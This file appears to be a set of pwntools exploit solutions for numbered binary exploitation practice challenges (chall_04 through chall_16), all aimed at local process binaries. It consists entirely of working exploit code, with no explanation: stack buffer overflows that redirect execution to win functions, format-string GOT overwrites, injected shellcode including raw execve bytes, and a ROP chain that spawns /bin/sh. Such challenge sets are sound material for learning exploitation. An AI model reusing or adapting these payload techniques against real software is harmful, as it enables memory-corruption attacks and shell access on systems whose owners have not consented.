#Chall_04
from pwn import*

p=process("./chall_04")
p.recv()
p.sendline()
p.sendline(b'a'*(0x40-8)+p64(0x004005b7))
p.interactive()

#chall_05
from pwn import*

p=process("./chall_05")
elf=ELF('./chall_05')
p.recv()
p.sendline()
p.recvuntil(": ")
mainaddr=int(p.recv(),16)
elf.address=mainaddr-elf.sym['main']
p.sendline(b'a'*(0x40-8)+p64(elf.sym['win']))
p.interactive()

#chall_06
from pwn import*
import re

p=process("./chall_06")
p.recvuntil(": ")
resp=p.recv()[:-1]
addr=int(resp,16)
context.arch="amd64"
shell=asm(shellcraft.amd64.sh())
payload=b'a'*(0x40-8)+p64(addr)
p.sendline(shell)
p.recv()
p.sendline(payload)
p.interactive()

#chall_07
from pwn import*

context.arch = "amd64"
shell=b''
shell += asm(shellcraft.amd64.sh())
p=process("./chall_07")
p.recvuntil("humanity")
p.sendline()
p.sendline(shell)
p.interactive()

#chall_08
from pwn import*

elf = ELF("chall_08")
p=process("./chall_08")
p.sendline(str((elf.got.puts-elf.sym.target)//8))
p.sendline(str(elf.sym.win))
p.interactive()

#chall_09
from pwn import*
p=process("./chall_09")
elf=ELF("chall_09")
p.sendline(xor(elf.string(elf.sym.key),b'\x30'))
p.interactive()

#chall_10
from pwn import*

p=process("./chall_10")
elf =ELF("chall_10")
p.recv()
p.sendline()
p.sendline(b'a'*(0x3a+4)+p32(elf.sym.win)+p32(0x08048345)+p32(0xdeadbeef))
p.interactive()

#chall_11
from pwn import*
p=process("./chall_11")
elf= ELF("chall_11")
p.sendline()
p.sendline(fmtstr_payload(6,{elf.got.fflush:elf.sym.win}))
p.interactive()

#chall_12
from pwn import*

p=process("./chall_12")
elf =ELF("chall_12")
p.recvuntil(": ")
leak = p.recv()
print(leak)
leak = int(leak[:-1],16)
print(hex(leak))
p.sendline()
elf.address = leak - elf.sym.main
p.sendline(fmtstr_payload(6,{elf.got.fflush:elf.sym.win}))
p.interactive()

#chall_13
from pwn import*

p=process("./chall_13")
elf = ELF("chall_13")
p.recv()
p.sendline()
p.sendline(b'a'*0x3e+p32(elf.sym.systemFunc))
p.interactive()

#chall_14
from pwn import*

#popRDI=0x0000000000400696 
popRSI=0x0000000000410263 
popRAX=0x00000000004158f4
popr13=0x000000000040da7b
popRDI=0x0000000000468a29
#from struct import pack

#p = lambda x : pack('Q', x)
elf = ELF("chall_14")
#IMAGE_BASE_0 = elf.address # 913a7aa51d9185a1088a36aa69b5a863758c4a92a8f050297c9491bd33b78d65
#rebase_0 = lambda x : p64(x + IMAGE_BASE_0)

#rop = b''

#rop += rebase_0(0x000000000000da7b) # 0x000000000040da7b: pop r13; ret; 
#rop += b'//bin/sh'
#rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret; 
#rop += rebase_0(0x00000000002b90e0)
#rop += rebase_0(0x0000000000068a29) # 0x0000000000468a29: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
#rop += p(0xdeadbeefdeadbeef)
#rop += p(0xdeadbeefdeadbeef)
#rop += p(0xdeadbeefdeadbeef)
#rop += p(0xdeadbeefdeadbeef)
#rop += rebase_0(0x000000000000da7b) # 0x000000000040da7b: pop r13; ret; 
#rop += p(0x0000000000000000)
#rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret; 
#rop += rebase_0(0x00000000002b90e8)
#rop += rebase_0(0x0000000000068a29) # 0x0000000000468a29: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
#rop += p(0xdeadbeefdeadbeef)
#rop += p(0xdeadbeefdeadbeef)
#rop += p(0xdeadbeefdeadbeef)
#rop += p(0xdeadbeefdeadbeef)
#rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret; 
#rop += rebase_0(0x00000000002b90e0)
#rop += rebase_0(0x0000000000010263) # 0x0000000000410263: pop rsi; ret; 
#rop += rebase_0(0x00000000002b90e8)
#rop += rebase_0(0x000000000004c086) # 0x000000000044c086: pop rdx; ret; 
#rop += rebase_0(0x00000000002b90e8)
#rop += rebase_0(0x00000000000158f4) # 0x00000000004158f4: pop rax; ret; 
#rop += p(0x000000000000003b)
#rop += rebase_0(0x0000000000074e35) # 0x0000000000474e35: syscall; ret; 
sys=0x000000000040120c
popRDX=0x0000000000449b15
p=process("./chall_14")
p.recv()
p.sendline()
payload = b'a'*0x68+p64(popr13)+b'/bin/sh\x00'+p64(popRDI)+p64(0)+p64(0)+p64(0)+p64(0)+p64(popRSI)+p64(0)+p64(popRDX)+p64(0)+p64(popRAX)+p64(59)+p64(sys)
#p.sendline(b'a'*0x68+rop)
p.sendline(payload)
p.interactive()

#chall_15
from pwn import*

p=process("./chall_15")
elf = ELF("chall_15")
context.arch = "amd64"
#shell = asm(shellcraft.amd64.sh())
p.sendline()
p.recvuntil(": ")
addr = p.recvrepeat(.2)[:-1]
shell = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
print(addr)
addr = int(addr,16)
payload = b'a'*(0x4e-0x44)+p32(0xfacade)+shell
print(len(payload))
payload+=b'b'*(0x4e-len(payload)-0xc)+p32(0xfacade)
print(len(payload))
payload+=b'c'*(0x4e-len(payload))+p64(addr+(14))
print(len(payload))
p.sendline(payload)
p.interactive()

#chall_16
from pwn import*
p=process("./chall_16")
elf = ELF("chall_16")
p.sendline(elf.string(elf.sym.key))
p.interactive()
